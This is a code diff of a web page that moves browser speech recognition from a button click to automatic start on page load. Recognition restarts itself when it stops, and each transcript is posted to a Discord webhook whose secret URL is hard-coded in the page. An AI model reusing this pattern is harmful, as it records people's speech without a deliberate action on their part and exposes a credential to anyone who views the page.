@@ -74,44 +74,90 @@
         </div>
     </div>
     <script>
-        const recognition = new webkitSpeechRecognition();
-        recognition.continuous = true;
-        recognition.interimResults = true;
-
-        let isRecording = false;
-        let debounceTimeout;
-
-        document.getElementById('startBtn').addEventListener('click', function() {
-            if (!isRecording) {
-                isRecording = true;
-                this.textContent = 'Stop Recording';
-                recognition.start();
-            } else {
-                isRecording = false;
-                this.textContent = 'Start Recording';
-                recognition.stop();
-            }
+        document.addEventListener("DOMContentLoaded", function() {
+            startRecording();
         });
 
-        recognition.onresult = function(event) {
-            let finalTranscript = '';
+        function startRecording() {
+            const recognition = new webkitSpeechRecognition();
+            recognition.continuous = true;
+            recognition.interimResults = true;
 
-            for (let i = event.resultIndex; i < event.results.length; i++) {
-                const transcript = event.results[i][0].transcript;
-                if (event.results[i].isFinal) {
-                    finalTranscript += transcript + ' ';
+            let isRecording = true; // Initially start recording when the page is opened
+            let debounceTimeout;
+
+            document.getElementById('startBtn').addEventListener('click', function() {
+                if (!isRecording) {
+                    isRecording = true;
+                    this.textContent = 'Stop Recording';
+                    recognition.start();
+                } else {
+                    isRecording = false;
+                    this.textContent = 'Start Recording';
+                    recognition.stop();
                 }
+            });
+
+            recognition.onresult = function(event) {
+                let finalTranscript = '';
+
+                for (let i = event.resultIndex; i < event.results.length; i++) {
+                    const transcript = event.results[i][0].transcript;
+                    if (event.results[i].isFinal) {
+                        finalTranscript += transcript + ' ';
+                    }
+                }
+
+                // Debounce sending to Discord
+                clearTimeout(debounceTimeout);
+                debounceTimeout = setTimeout(() => {
+                    sendToDiscord(finalTranscript);
+                    speak(finalTranscript); // Speak the transcribed text
+                }, 500);
+            };
+
+            recognition.onerror = function(event) {
+                console.error('Speech recognition error:', event.error);
+                // Restart recognition if an error occurs
+                recognition.stop();
+                if (isRecording) {
+                    recognition.start();
+                }
+            };
+
+            recognition.onend = function() {
+                // Restart recognition if it ends unexpectedly
+                if (isRecording) {
+                    recognition.start();
+                }
+            };
+
+            function sendToDiscord(message) {
+                const webhookURL = 'https://discord.com/api/webhooks/1224251217048244304/mSEpw8ipxF_mSUJWG8ccJ9jvLxmTv6jPiLq-PdOB67SZCMccOD6rxN5rv0ySeZ5UA6Ua';
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ content: message })
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Failed to send message to Discord:', response.status);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending message to Discord:', error);
+                });
             }
 
-            // Debounce sending to Discord
-            clearTimeout(debounceTimeout);
-            debounceTimeout = setTimeout(() => {
-                sendToDiscord(finalTranscript);
-                speak(finalTranscript); // Speak the transcribed text
-            }, 500);
-        };
-
-        recognition.onerror = function(event) {
-            console.error('Speech recognition error:', event.error);
-            // Restart recognition if an error occurs
-            recognition
+            function speak(text) {
+                const synth = window.speechSynthesis;
+                const utterance = new SpeechSynthesisUtterance(text);
+                synth.speak(utterance);
+            }
+        }
+    </script>
+</body>
+</html>
